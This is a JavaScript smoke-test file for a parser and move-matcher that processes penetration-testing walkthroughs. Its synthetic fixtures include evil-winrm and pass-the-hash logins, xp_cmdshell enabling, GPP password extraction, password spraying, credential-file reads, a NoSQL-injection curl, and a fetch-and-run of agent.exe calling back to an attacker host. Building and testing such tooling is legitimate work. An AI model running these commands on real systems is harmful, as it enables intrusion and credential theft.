#!/usr/bin/env node
/*
 * tests/engine/challenge-labs-trajectories-smoke.js
 *
 * 100% synthetic, corpus-free smoke suite verifying Wave-B Slice B4:
 *   1. Session-launcher followPrompt attachment & propagation across
 *      tools/corpus/markdown-extractor.js, assets/ui/ingest.js, and
 *      tools/corpus/sandbox-loader.js
 *   2. Windows OpenSSH prompt recognition (<user>@<HOST> C:\path>)
 *   3. Line-1 plain-English caption skipping without swallowing tool headers
 *   4. Hard-wrapped terminal path continuation joining (Windows & Unix)
 *   5. tools/corpus/harvest-trajectories.js catalog matcher disambiguation,
 *      bare subshell housekeeping, negative-outcome gate-evidence guard, and
 *      dual-command continuation
 *   6. Multi-target attribution (on-host shell pinning, Ligolo 240.0.0.1
 *      aliasing, sequential 3rd-octet lab-revert drift normalization,
 *      multi-credential dry-probe retirement, and end-to-end closed-loop #1)
 *
 * House style: no em dashes, no en dashes, no emoji, zero box identities,
 * zero lab literals, zero external corpus dependencies.
 */
'use strict';

const sandboxLoader = require('../../tools/corpus/sandbox-loader');
const mdExtractor = require('../../tools/corpus/markdown-extractor');
const harvestTraj = require('../../tools/corpus/harvest-trajectories');

let passed = 0;
function check(label, cond, detail) {
  if (!cond) {
    console.error('FAIL: ' + label + (detail ? ' :: ' + detail : ''));
    process.exit(1);
  }
  passed++;
}

const OBOL = sandboxLoader.createSandbox();

// ---- 1. Session-Launcher followPrompt Attachment & Propagation ----------------
{
  const winrmMd = [
    '```console',
    "kali@kali:~$ evil-winrm -i 10.240.10.20 -u svc_portal -p 'PortalKey_99#z'",
    '',
    'Evil-WinRM shell v3.5',
    '',
    'Info: Establishing connection to remote endpoint',
    '*Evil-WinRM* PS C:\\Users\\svc_portal\\Documents> whoami /all',
    'USER INFORMATION',
    '----------------',
    'synthgrid\\svc_portal S-1-5-21-900100200-300400500-600700800-1109',
    '```'
  ].join('\n');

  const extractedWinrm = mdExtractor.extractWalkthroughTurns(winrmMd, { slug: 'synth-winrm' });
  check('followPrompt (markdown-extractor): splits evil-winrm launcher and follow-up PS turn',
    extractedWinrm.turns.length === 2
    && /^evil-winrm\b/.test(extractedWinrm.turns[0].command)
    && extractedWinrm.turns[1].command === 'whoami /all');
  check('followPrompt (markdown-extractor): attaches Evil-WinRM prompt to launcher turn',
    extractedWinrm.turns[0].followPrompt === '*Evil-WinRM* PS C:\\Users\\svc_portal\\Documents>');

  const mssqlMd = [
    '```text',
    "impacket-mssqlclient synthgrid.internal/sa:'GridSynth_2026!a'@10.240.10.20",
    'Impacket v0.11.0 - Copyright 2023 Fortra',
    '',
    '[*] Encryption required, switching to TLS',
    '[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master',
    '[*] INFO(DB-NODE02): Line 1: Changed database context to \'master\'.',
    'SQL (sa  dbo@master)> enable_xp_cmdshell',
    '[*] INFO(DB-NODE02): Configuration option \'xp_cmdshell\' changed from 0 to 1.',
    '```'
  ].join('\n');

  const extractedMssql = mdExtractor.extractWalkthroughTurns(mssqlMd, { slug: 'synth-mssql' });
  check('followPrompt (unprompted launcher): attaches SQL prompt to impacket-mssqlclient turn',
    extractedMssql.turns.length === 2
    && extractedMssql.turns[0].followPrompt === 'SQL (sa  dbo@master)>'
    && /enable_xp_cmdshell/.test(extractedMssql.turns[1].command));

  // Verify stateless probe receives followPrompt even when stdout has ONLY TLS banner (no ENVCHANGE)
  const tlsOnlyMssqlMd = [
    '```text',
    "impacket-mssqlclient synthgrid.internal/sa:'GridSynth_2026!a'@10.240.10.20",
    'Impacket v0.11.0 - Copyright 2023 Fortra',
    '[*] Encryption required, switching to TLS',
    'SQL (sa  dbo@master)> SELECT @@version;',
    'Microsoft SQL Server 2019 (RTM)',
    '```'
  ].join('\n');
  const tlsUnits = mdExtractor.extractWalkthroughTurns(tlsOnlyMssqlMd, { slug: 'synth-mssql-tls' }).turns;
  check('followPrompt (command unit): encodes followPrompt channel cleanly for facts-axis',
    tlsUnits.length >= 1 && tlsUnits[0].followPrompt === 'SQL (sa  dbo@master)>');

  const tlsProbe = sandboxLoader.probeBlockStateless(OBOL, {
    command: tlsUnits[0].command,
    stdout: tlsUnits[0].output,
    promptLine: tlsUnits[0].promptLine
  });
  check('followPrompt (probeBlockStateless): mints db.session and mssql.authenticated from TLS banner + SQL followPrompt',
    tlsProbe.supported_kinds.includes('db.session')
    && tlsProbe.supported_kinds.includes('mssql.authenticated'),
    JSON.stringify(tlsProbe.supported_kinds));

  const rawPasteMssql = [
    "kali@kali:~$ impacket-mssqlclient synthgrid.internal/sa:'GridSynth_2026!a'@10.240.10.20",
    'Impacket v0.11.0 - Copyright 2023 Fortra',
    '[*] Encryption required, switching to TLS',
    'SQL (sa  dbo@master)> enable_xp_cmdshell',
    '[*] INFO(DB-NODE02): Configuration option \'xp_cmdshell\' changed from 0 to 1.'
  ].join('\n');
  const uiSegs = OBOL.ingest.splitSession(rawPasteMssql);
  check('followPrompt (ingest.splitSession): attaches non-enumerable followPrompt to launcher segment without breaking Object.keys',
    uiSegs.length === 2
    && uiSegs[0].followPrompt === 'SQL (sa  dbo@master)>'
    && Object.keys(uiSegs[0]).indexOf('followPrompt') < 0);
}

// ---- 2. Windows OpenSSH Prompt Recognition -----------------------------------
{
  const winSshMd = [
    '```text',
    'svc_portal@APP-NODE01 C:\\Users\\svc_portal> whoami /priv',
    'PRIVILEGES INFORMATION',
    '----------------------',
    'SeImpersonatePrivilege        Impersonate a client after authentication Enabled',
    'synthgrid\\ops_admin@APP-NODE01 C:\\Windows\\system32> net localgroup administrators',
    'Alias name     administrators',
    'Administrator',
    '```'
  ].join('\n');

  const sshTurns = mdExtractor.extractWalkthroughTurns(winSshMd, { slug: 'synth-win-openssh' }).turns;
  check('Windows OpenSSH prompt (markdown-extractor): splits user@HOST C:\\path> and domain\\user@HOST C:\\path>',
    sshTurns.length === 2
    && sshTurns[0].command === 'whoami /priv'
    && sshTurns[0].hostHint === 'windows'
    && sshTurns[1].command === 'net localgroup administrators'
    && sshTurns[1].hostHint === 'windows');

  const rawWinSsh = [
    'svc_portal@APP-NODE01 C:\\Users\\svc_portal> whoami /priv',
    'SeImpersonatePrivilege Enabled',
    'synthgrid\\ops_admin@APP-NODE01 C:\\Windows\\system32> hostname',
    'APP-NODE01'
  ].join('\n');
  const uiSshSegs = OBOL.ingest.splitSession(rawWinSsh);
  check('Windows OpenSSH prompt (ingest.splitSession + deriveCommand): extracts stripped commands cleanly',
    uiSshSegs.length === 2
    && uiSshSegs[0].command === 'whoami /priv'
    && uiSshSegs[1].command === 'hostname'
    && OBOL.ingest.deriveCommand('svc_portal@APP-NODE01 C:\\Users\\svc_portal> ipconfig /all\nWindows IP Configuration') === 'ipconfig /all');
}

// ---- 3. Line-1 Plain-English Caption Skipping --------------------------------
{
  const captionedMd = [
    '```text',
    'In Kali',
    'nmap -sV -p 80,445 10.240.10.20',
    'Nmap scan report for 10.240.10.20',
    'PORT    STATE SERVICE VERSION',
    '80/tcp  open  http    nginx 1.24.0',
    '445/tcp open  microsoft-ds',
    '```',
    '',
    '```text',
    '# Initial',
    "nxc smb 10.240.10.20 -u svc_portal -p 'PortalKey_99#z' --shares",
    'SMB         10.240.10.20    445    APP-NODE01       [+] synthgrid.internal\\svc_portal:PortalKey_99#z',
    '```',
    '',
    '```text',
    'Access mysql db',
    'mysql -h 10.240.10.20 -u db_maint -pPortalKey_99 -e "SHOW DATABASES;"',
    'Database',
    'portal_prod',
    '```'
  ].join('\n');

  const capTurns = mdExtractor.extractWalkthroughTurns(captionedMd, { slug: 'synth-captions' }).turns;
  check('caption skip (markdown-extractor): promotes line-2 CLI command beneath In Kali, # Initial, and Access mysql db',
    capTurns.length === 3
    && capTurns[0].command === 'nmap -sV -p 80,445 10.240.10.20'
    && /^nxc smb 10\.240\.10\.20/.test(capTurns[1].command)
    && /^mysql -h 10\.240\.10\.20/.test(capTurns[2].command));

  check('caption skip (negative guard): never classifies real tool headers as plain-English captions',
    mdExtractor.isPlainEnglishCaptionLine('Nmap scan report for 10.240.10.20') === false
    && mdExtractor.isPlainEnglishCaptionLine('HTTP/1.1 200 OK') === false
    && mdExtractor.isPlainEnglishCaptionLine('Directory of C:\\Users\\svc_portal') === false);

  const uiCapDerived = OBOL.ingest.deriveCommand('Enumerate users and passwords\nnxc smb 10.240.10.20 -u svc_portal -p PortalKey_99 --users\nSMB 10.240.10.20 445 APP-NODE01');
  check('caption skip (ingest.deriveCommand): skips line-1 prose caption and derives line-2 CLI command',
    uiCapDerived === 'nxc smb 10.240.10.20 -u svc_portal -p PortalKey_99 --users');
}

// ---- 4. Hard-Wrapped Terminal Path Continuation Joining ----------------------
{
  const wrappedPsMd = [
    '```powershell',
    'PS C:\\Users\\svc_portal> type C:\\Users\\svc_portal\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine',
    '\\ConsoleHost_history.txt',
    '$sec = ConvertTo-SecureString "GridSynth_2026!a" -AsPlainText -Force',
    '```'
  ].join('\n');

  const psTurns = mdExtractor.extractWalkthroughTurns(wrappedPsMd, { slug: 'synth-wrap-ps' }).turns;
  check('wrapped path (Windows PS): joins \\ConsoleHost_history.txt onto command and leaves file body in stdout',
    psTurns.length === 1
    && psTurns[0].command === 'type C:\\Users\\svc_portal\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'
    && psTurns[0].stdout.indexOf('ConvertTo-SecureString') >= 0
    && psTurns[0].stdout.indexOf('\\ConsoleHost_history.txt') < 0);

  const wrappedUnixRaw = [
    'operator@appnode:~$ cat /var/www/portal/application/config',
    '/database.ini',
    'db_user = db_maint',
    'db_pass = GridSynth_2026!a'
  ].join('\n');
  const unixTurns = mdExtractor.extractWalkthroughTurns('```console\n' + wrappedUnixRaw + '\n```', { slug: 'synth-wrap-unix' }).turns;
  const uiUnixSegs = OBOL.ingest.splitSession(wrappedUnixRaw);
  check('wrapped path (Unix + ingest.splitSession): joins /database.ini onto cat command in both extractor and UI splitter',
    unixTurns.length === 1
    && unixTurns[0].command === 'cat /var/www/portal/application/config/database.ini'
    && uiUnixSegs.length === 1
    && uiUnixSegs[0].command === 'cat /var/www/portal/application/config/database.ini'
    && /db_pass = GridSynth_2026!a/.test(uiUnixSegs[0].stdout));

  const findSuidRaw = [
    'operator@appnode:~$ find / -perm -4000 2>/dev/null',
    '/usr/bin/passwd',
    '/usr/bin/chsh'
  ].join('\n');
  const findTurns = mdExtractor.extractWalkthroughTurns('```console\n' + findSuidRaw + '\n```', { slug: 'synth-find-guard' }).turns;
  check('wrapped path (negative guard): does NOT join /usr/bin/passwd stdout onto find ... 2>/dev/null',
    findTurns.length === 1
    && findTurns[0].command === 'find / -perm -4000 2>/dev/null'
    && findTurns[0].stdout.indexOf('/usr/bin/passwd') >= 0);
}

// ---- 5. Catalog Matcher Disambiguation & Diagnostic Guards -------------------
{
  const FactSet = OBOL.facts.FactSet;

  // 5A. Remote Windows session: password (-p) vs pass-the-hash (-H) with/without loot.ntds
  const baseWinFacts = new FactSet([
    { kind: 'port:5985', scope: 'host:10.240.10.20', state: 'supported', value: { port: 5985 } },
    { kind: 'winrm.reachable', scope: 'host:10.240.10.20', state: 'supported', value: {} },
    { kind: 'credential.available', scope: 'host:10.240.10.20', state: 'supported', value: { user: 'svc_portal', password: 'PortalKey_99#z' } }
  ]);
  const pwWinrmMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: "evil-winrm -i 10.240.10.20 -u svc_portal -p 'PortalKey_99#z'"
  }, { facts: baseWinFacts, target: '10.240.10.20' });
  const pwWinrmIds = pwWinrmMatches.map(m => m.id);
  check('matcher B2.1: evil-winrm -p maps to win-interactive-shell and excludes own-domain-pth',
    pwWinrmIds[0] === 'win-interactive-shell' && !pwWinrmIds.includes('own-domain-pth'),
    JSON.stringify(pwWinrmIds));

  const pthNoNtdsMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'evil-winrm -i 10.240.10.20 -u Administrator -H 0123456789abcdef0123456789abcdef'
  }, { facts: baseWinFacts, target: '10.240.10.20' });
  const pthNoNtdsIds = pthNoNtdsMatches.map(m => m.id);
  check('matcher B2.1: evil-winrm -H without loot.ntds excludes own-domain-pth and maps to win-interactive-shell',
    pthNoNtdsIds[0] === 'win-interactive-shell' && !pthNoNtdsIds.includes('own-domain-pth'),
    JSON.stringify(pthNoNtdsIds));

  const ntdsFacts = new FactSet(baseWinFacts.facts.concat([
    { kind: 'loot.ntds', scope: 'host:10.240.10.20', state: 'supported', value: {} }
  ]));
  const pthWithNtdsMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'evil-winrm -i 10.240.10.20 -u Administrator -H 0123456789abcdef0123456789abcdef'
  }, { facts: ntdsFacts, target: '10.240.10.20' });
  check('matcher B2.1: evil-winrm -H with loot.ntds maps to own-domain-pth at #1',
    pthWithNtdsMatches.length > 0 && pthWithNtdsMatches[0].id === 'own-domain-pth');

  const rdpMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: "xfreerdp /v:10.240.10.20 /u:svc_portal /p:'PortalKey_99#z' /cert:ignore"
  }, { facts: baseWinFacts, target: '10.240.10.20' });
  check('matcher B2.1: xfreerdp maps to win-interactive-shell',
    rdpMatches.some(m => m.id === 'win-interactive-shell'));

  // 5B. Windows multi-extension loot sweep vs privileged root flag read
  const unprivWinFacts = new FactSet([
    { kind: 'os.windows', scope: 'host:10.240.10.20', state: 'supported', value: {} },
    { kind: 'foothold.windows', scope: 'host:10.240.10.20', state: 'supported', value: { user: 'svc_portal' } }
  ]);
  const lootSweepMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'Get-ChildItem -Path C:\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc -File -Recurse -ErrorAction SilentlyContinue',
    kind: 'powershell',
    hostHint: 'windows'
  }, { facts: unprivWinFacts, target: '10.240.10.20' });
  const lootSweepIds = lootSweepMatches.map(m => m.id);
  check('matcher B2.2: recursive multi-extension Get-ChildItem maps to stored-credentials/windows-enum and excludes flag-hunt-root-windows',
    (lootSweepIds[0] === 'stored-credentials' || lootSweepIds[0] === 'windows-enum')
    && !lootSweepIds.includes('flag-hunt-root-windows'),
    JSON.stringify(lootSweepIds));

  const adminWinFacts = new FactSet(unprivWinFacts.facts.concat([
    { kind: 'priv.windows.admin', scope: 'host:10.240.10.20', state: 'supported', value: {} }
  ]));
  const rootFlagMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'type C:\\Users\\Administrator\\Desktop\\proof.txt',
    kind: 'cmd',
    hostHint: 'windows'
  }, { facts: adminWinFacts, target: '10.240.10.20' });
  check('matcher B2.2: direct Administrator Desktop proof.txt read maps to flag-hunt-root-windows at #1',
    rootFlagMatches.length > 0 && rootFlagMatches[0].id === 'flag-hunt-root-windows');

  // 5C. Authenticated vs anonymous SMB, token boundaries, generic python exploit, archive cracking
  const authSmbMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: "nxc smb 10.240.10.20 -u svc_portal -p 'PortalKey_99#z' --shares"
  }, { facts: baseWinFacts, target: '10.240.10.20' });
  const authSmbIds = authSmbMatches.map(m => m.id);
  check('matcher B2.3: authenticated nxc smb --shares maps to smb-share-inventory and excludes recon-smb-anon',
    authSmbIds.includes('smb-share-inventory') && !authSmbIds.includes('recon-smb-anon'),
    JSON.stringify(authSmbIds));

  const anonSmbMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: "nxc smb 10.240.10.20 -u '' -p '' --shares"
  }, { facts: new FactSet([]), target: '10.240.10.20' });
  check('matcher B2.3: null-credential nxc smb --shares maps to recon-smb-anon',
    anonSmbMatches.length > 0 && anonSmbMatches[0].id === 'recon-smb-anon');

  const sprayWordlistMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'nxc smb 10.240.10.20 -u users.txt -p passwords.txt --continue-on-success'
  }, { facts: baseWinFacts, target: '10.240.10.20' });
  const sprayWordlistIds = sprayWordlistMatches.map(m => m.id);
  check('matcher token-boundary: users.txt never false-matches Windows Users flag-hunt moves',
    !sprayWordlistIds.includes('flag-hunt-windows') && !sprayWordlistIds.includes('flag-hunt-root-windows'),
    JSON.stringify(sprayWordlistIds));

  const genericPyMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'python3 49757.py -t http://10.240.10.20 --cmd id'
  }, { facts: new FactSet([]), target: '10.240.10.20' });
  check('matcher B2.4: generic python3 exploit script never false-matches sireprat-iot-exec',
    !genericPyMatches.some(m => m.id === 'sireprat-iot-exec'));

  const zipJohnMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'john --format=zip archive.hash --wordlist=/usr/share/wordlists/rockyou.txt'
  }, { facts: new FactSet([]), target: '10.240.10.20' });
  const zipJohnIds = zipJohnMatches.map(m => m.id);
  check('matcher archive: john --format=zip maps to crack-archive and excludes cisco-decrypt',
    zipJohnIds[0] === 'crack-archive' && !zipJohnIds.includes('cisco-decrypt'),
    JSON.stringify(zipJohnIds));

  // 5D. Subshell housekeeping & negative-turn gateEvidencePresentInHistory guard
  check('housekeeping B2.5: bare subshell entries classify as subshell_entry housekeeping',
    harvestTraj.isHousekeepingTurn({ command: 'powershell -ep bypass' }).housekeeping === true
    && harvestTraj.isHousekeepingTurn({ command: 'sudo -i' }).housekeeping === true
    && harvestTraj.isHousekeepingTurn({ command: 'cmd.exe' }).housekeeping === true
    && harvestTraj.isHousekeepingTurn({ command: '/bin/bash' }).housekeeping === true);
  check('housekeeping B2.5: sudo -l and powershell -c payload remain actionable',
    harvestTraj.isHousekeepingTurn({ command: 'sudo -l' }).housekeeping === false
    && harvestTraj.isHousekeepingTurn({ command: 'powershell -c "whoami /priv"' }).housekeeping === false);

  const negHistProbe = harvestTraj.gateEvidencePresentInHistory(['priv.sudo'], [{
    step_index: 0,
    command: 'sudo -l',
    stdout: 'Sorry, user svc_portal may not run sudo on appnode.',
    housekeeping: false,
    minted_count: 0,
    outcome_kind: 'authorization-denied'
  }]);
  check('gateEvidencePresentInHistory: ignores authorization-denied / completed-negative turns (no false PARSE_OR_SHAPE_MISS)',
    negHistProbe.found === false);

  const posHistProbe = harvestTraj.gateEvidencePresentInHistory(['priv.sudo'], [{
    step_index: 0,
    command: 'sudo -l',
    stdout: 'User svc_portal may run the following commands on appnode:\n    (ALL) NOPASSWD: /usr/bin/env',
    housekeeping: false,
    minted_count: 0,
    outcome_kind: 'unparsed'
  }]);
  check('gateEvidencePresentInHistory: still flags genuinely unparsed positive evidence',
    posHistProbe.found === true);
}

// ---- 6. Multi-Target Routing, Ligolo 240.0.0.1, Lab-Revert Drift & Replay ----
{
  // 6A. Sequential 3rd-octet lab-revert drift normalization + co-occurrence guard
  const revertTurns = [
    { command: 'nmap -sV 192.168.210.45', stdout: 'Nmap scan report for 192.168.210.45\nPORT STATE SERVICE\n80/tcp open http\n' },
    { command: 'whatweb http://192.168.210.45', stdout: 'http://192.168.210.45 [200 OK] nginx' },
    { command: 'gobuster dir -u http://192.168.222.45 -w /usr/share/wordlists/dirb/common.txt', stdout: '/portal (Status: 200) [Size: 512]' }
  ];
  const revertNet = harvestTraj.inferEngagementNetworking(revertTurns, { lhost: '192.168.45.180' });
  check('lab-revert drift: aliases sequential 192.168.222.45 onto canonical 192.168.210.45',
    revertNet.primaryTarget === '192.168.210.45'
    && revertNet.ipAliasMap['192.168.222.45'] === '192.168.210.45'
    && revertNet.targets.length === 1);

  const cooccurTurns = [
    { command: 'nmap -sV 192.168.210.45 192.168.222.45', stdout: 'Nmap scan report for 192.168.210.45\nNmap scan report for 192.168.222.45\n' }
  ];
  const cooccurNet = harvestTraj.inferEngagementNetworking(cooccurTurns, { lhost: '192.168.45.180' });
  check('lab-revert drift (co-occurrence guard): does NOT alias IPs that co-occur in the same turn',
    Object.keys(cooccurNet.ipAliasMap).length === 0);

  const revertReplay = harvestTraj.replayWalkthrough(OBOL, {
    slug: 'synth-revert',
    turns: revertTurns,
    trajectory_checkpoints: [{
      step_index: 3,
      target_ip: '192.168.222.45',
      required_gates: ['http.reachable']
    }]
  }, { lhost: '192.168.45.180' });
  check('lab-revert drift (replayWalkthrough): normalizes post-revert turns and checkpoints onto canonical IP',
    revertReplay.totals.stalled_steps === 0
    && revertReplay.steps[2].target_ip === '192.168.210.45'
    && revertReplay.checkpoints[0].ok === true
    && revertReplay.checkpoints[0].target_ip === '192.168.210.45');

  // 6B. Multi-credential closed-loop dry-probe retirement
  const credSession = sandboxLoader.createEngagementSession(OBOL, {
    target: '10.240.10.20',
    lhost: '10.10.14.99'
  });
  credSession.ingestTurn({
    actionId: 'nmap-fast-open-ports',
    command: 'nmap -Pn -sV 10.240.10.20',
    stdout: 'Nmap scan report for 10.240.10.20\nPORT STATE SERVICE\n445/tcp open microsoft-ds\n5985/tcp open wsman\n'
  });
  credSession.ingestTurn({
    actionId: 'recon-smb-anon',
    command: "nxc smb 10.240.10.20 -u '' -p '' --shares",
    stdout: '[OBOL: completed with no output / nothing found]'
  });
  OBOL.store.addFacts([
    { kind: 'credential.available', scope: 'host:10.240.10.20', state: 'supported', value: { user: 'svc_alpha', password: 'AlphaPassword9!' } },
    { kind: 'credential.available', scope: 'host:10.240.10.20', state: 'supported', value: { user: 'svc_beta', password: 'BetaPassword9!' } }
  ], 'synthetic-test', '10.240.10.20');

  const credCoach = credSession.computeCoach('10.240.10.20');
  const winShellCard = credCoach.onFlow.find(m => m.id === 'win-interactive-shell');
  const winShellIdx = credCoach.onFlow.findIndex(m => m.id === 'win-interactive-shell');
  check('multi-credential setup: win-interactive-shell sits behind validate-credential in Ready Now',
    Boolean(winShellCard) && winShellIdx > 0);

  const multiCredEval = harvestTraj.evaluateClosedLoopReachability(
    credSession,
    [{ move: winShellCard, id: winShellCard.id, title: winShellCard.title, match_score: 30 }],
    { command: "evil-winrm -i 10.240.10.20 -u svc_alpha -p 'AlphaPassword9!'" },
    { targetIp: '10.240.10.20' }
  );
  check('multi-credential closed-loop promotion: retires preceding validate-credential card cleanly when >= 2 credentials exist',
    multiCredEval.reachable === true && multiCredEval.mode === 'closed_loop_promoted_top1',
    JSON.stringify(multiCredEval));

  // 6C. Dry-probe sentinel 0-fact guarantee (never hallucinates positive facts from canned command strings)
  const nosqlSentinelProbe = sandboxLoader.probeBlockStateless(OBOL, {
    actionId: 'nosql-injection',
    command: "curl -s -X POST http://10.240.10.20/login -d 'user[$ne]=x&pass[$ne]=x'",
    stdout: '[OBOL: completed with no output / nothing found]'
  });
  check('dry-probe sentinel: produces 0 positive facts and grades completed-negative even on parameterized login curl',
    nosqlSentinelProbe.supported_kinds.length === 0
    && nosqlSentinelProbe.outcome
    && nosqlSentinelProbe.outcome.kind === 'completed-negative');

  // 6D. End-to-End Multi-Host Trajectory Replay (on-host shell pinning + Ligolo 240.0.0.1 + lateral host switch)
  const multiHostMd = [
    '```text',
    'In Kali',
    'nmap -Pn -sC -sV 10.240.10.20',
    'Nmap scan report for 10.240.10.20',
    'PORT     STATE SERVICE       VERSION',
    '80/tcp   open  http          Microsoft IIS httpd 10.0',
    '445/tcp  open  microsoft-ds  Windows Server 2019 microsoft-ds',
    '5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)',
    '```',
    '',
    '```console',
    'kali@kali:~$ gobuster dir -u http://10.240.10.20 -w /usr/share/wordlists/dirb/common.txt',
    '/portal               (Status: 200) [Size: 1420]',
    "kali@kali:~$ nxc smb 10.240.10.20 -u '' -p '' --shares",
    'SMB         10.240.10.20    445    APP-NODE01       [*] Enumerated shares',
    'SMB         10.240.10.20    445    APP-NODE01       Share           Permissions     Remark',
    'SMB         10.240.10.20    445    APP-NODE01       -----           -----------     ------',
    'SMB         10.240.10.20    445    APP-NODE01       Replication     READ            SYSVOL Replication',
    "kali@kali:~$ nxc smb 10.240.10.20 -u '' -p '' -M gpp_password",
    'GPP_PASSWORD 10.240.10.20 445 APP-NODE01 [+] Found credentials in Groups.xml',
    'GPP_PASSWORD 10.240.10.20 445 APP-NODE01 [+] Username: svc_portal',
    'GPP_PASSWORD 10.240.10.20 445 APP-NODE01 [+] Password: PortalKey_99#z',
    "kali@kali:~$ nxc smb 10.240.10.20 -u svc_portal -p 'PortalKey_99#z'",
    'SMB         10.240.10.20    445    APP-NODE01       [*] Windows Server 2019 Build 17763 x64 (name:APP-NODE01) (domain:synthgrid.internal)',
    'SMB         10.240.10.20    445    APP-NODE01       [+] synthgrid.internal\\svc_portal:PortalKey_99#z',
    '```',
    '',
    '```console',
    "kali@kali:~$ evil-winrm -i 10.240.10.20 -u svc_portal -p 'PortalKey_99#z'",
    'Evil-WinRM shell v3.5',
    'Info: Establishing connection to remote endpoint',
    '*Evil-WinRM* PS C:\\Users\\svc_portal\\Documents> whoami /priv',
    'PRIVILEGES INFORMATION',
    '----------------------',
    'SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled',
    '*Evil-WinRM* PS C:\\Users\\svc_portal\\Documents> ipconfig',
    'Windows IP Configuration',
    '   IPv4 Address. . . . . . . . . . . : 10.240.10.20',
    '   IPv4 Address. . . . . . . . . . . : 172.29.50.11',
    '   Default Gateway . . . . . . . . . : 172.29.50.1',
    '*Evil-WinRM* PS C:\\Users\\svc_portal\\Documents> iwr -uri http://172.29.50.99:8000/agent.exe -Outfile C:\\Windows\\Temp\\agent.exe',
    '*Evil-WinRM* PS C:\\Users\\svc_portal\\Documents> C:\\Windows\\Temp\\agent.exe -connect 10.10.14.99:11601 -ignore-cert',
    '```',
    '',
    '```console',
    'kali@kali:~$ nmap -Pn -sV -p 8080 240.0.0.1',
    'Nmap scan report for 240.0.0.1',
    'PORT     STATE SERVICE VERSION',
    '8080/tcp open  http    Apache Tomcat 9.0.80',
    'kali@kali:~$ nmap -Pn -sC -sV 172.29.50.30',
    'Nmap scan report for 172.29.50.30',
    'PORT    STATE SERVICE      VERSION',
    '22/tcp  open  ssh          OpenSSH 8.9p1 Ubuntu',
    '80/tcp  open  http         Apache httpd 2.4.52 ((Ubuntu))',
    'kali@kali:~$ gobuster dir -u http://172.29.50.30 -w /usr/share/wordlists/dirb/common.txt',
    '/admin                (Status: 301) [Size: 312]',
    '```'
  ].join('\n');

  const multiReport = harvestTraj.replayWalkthrough(OBOL, {
    slug: 'synth-multihost-e2e',
    markdown: multiHostMd,
    trajectory_checkpoints: [
      {
        step_index: 1,
        target_ip: '10.240.10.20',
        expected_move_ids: ['content-discovery'],
        required_gates: ['ports.open', 'http.reachable'],
        require_closed_loop_top1: true
      },
      {
        step_index: 12,
        target_ip: '172.29.50.30',
        expected_move_ids: ['content-discovery'],
        required_gates: ['ports.open', 'http.reachable'],
        require_closed_loop_top1: true
      }
    ]
  }, {
    multiTarget: true,
    lhost: '10.10.14.99'
  });

  const ipconfigStep = multiReport.steps.find(s => /^ipconfig\b/i.test(s.command));
  const iwrStep = multiReport.steps.find(s => /^iwr\b/i.test(s.command));
  const ligoloLoopbackStep = multiReport.steps.find(s => /240\.0\.0\.1/.test(s.command));
  const hostBScanStep = multiReport.steps.find(s => /172\.29\.50\.30/.test(s.command) && /^nmap\b/i.test(s.command));

  check('multi-target attribution: on-host ipconfig and iwr http://172.29.50.99:8000/... stay pinned to foothold host 10.240.10.20',
    Boolean(ipconfigStep && iwrStep)
    && ipconfigStep.target_ip === '10.240.10.20'
    && iwrStep.target_ip === '10.240.10.20'
    && !multiReport.targets_observed.includes('172.29.50.99')
    && !multiReport.targets_observed.includes('172.29.50.1'),
    JSON.stringify({ targets: multiReport.targets_observed, ipconfigStep, iwrStep }));

  check('multi-target attribution: Ligolo 240.0.0.1 scan routes onto tunnelled agent host 10.240.10.20 without creating 240.0.0.1 target',
    Boolean(ligoloLoopbackStep)
    && ligoloLoopbackStep.target_ip === '10.240.10.20'
    && !multiReport.targets_observed.includes('240.0.0.1'));

  check('multi-target attribution: explicit remote scan against 172.29.50.30 switches active target cleanly',
    Boolean(hostBScanStep)
    && hostBScanStep.target_ip === '172.29.50.30'
    && multiReport.targets_observed.includes('172.29.50.30'));

  check('multi-target closed-loop replay: reaches 100% closed-loop #1 reachability across multi-host trajectory and passes all checkpoints',
    multiReport.totals.graded_steps >= 5
    && multiReport.totals.stalled_steps === 0
    && multiReport.totals.reachability_rate === 1
    && multiReport.checkpoints.length === 2
    && multiReport.checkpoints.every(cp => cp.ok === true),
    JSON.stringify({
      totals: multiReport.totals,
      checkpoints: multiReport.checkpoints,
      stalled: multiReport.steps.filter(s => s.reachability && !s.reachability.reachable)
    }));
}

// ---- 7. Wave-C Commandless Sniffing, Negative Guards, Fix Cards & Retirement --
{
  const hostA = '10.240.30.10';
  const hostB = '10.240.30.20';

  // 7A. Command-stripped indented Nmap with NSE annotation and headerless multi-port paste (C2-1)
  const strippedIndentedNmap = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostA,
    command: '',
    stdout: [
      '  8080/tcp open  http    nginx 1.24.0',
      '  |_http-title: Synthetic Portal'
    ].join('\r\n')
  });
  check('Wave-C C2-1a: command-stripped indented Nmap port + script block mints ports.open, http.reachable, and scan.nmap.version',
    strippedIndentedNmap.supported_kinds.includes('ports.open')
    && strippedIndentedNmap.supported_kinds.includes('http.reachable')
    && strippedIndentedNmap.supported_kinds.includes('scan.nmap.version'),
    JSON.stringify(strippedIndentedNmap.supported_kinds));

  const strippedMultiPortNmap = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostA,
    command: '',
    stdout: [
      '22/tcp   open  ssh     OpenSSH 9.2p1',
      '8000/tcp open  http    Python http.server 3.11'
    ].join('\n')
  });
  check('Wave-C C2-1b: command-stripped headerless multi-port Nmap rows mint ports.open and http.reachable',
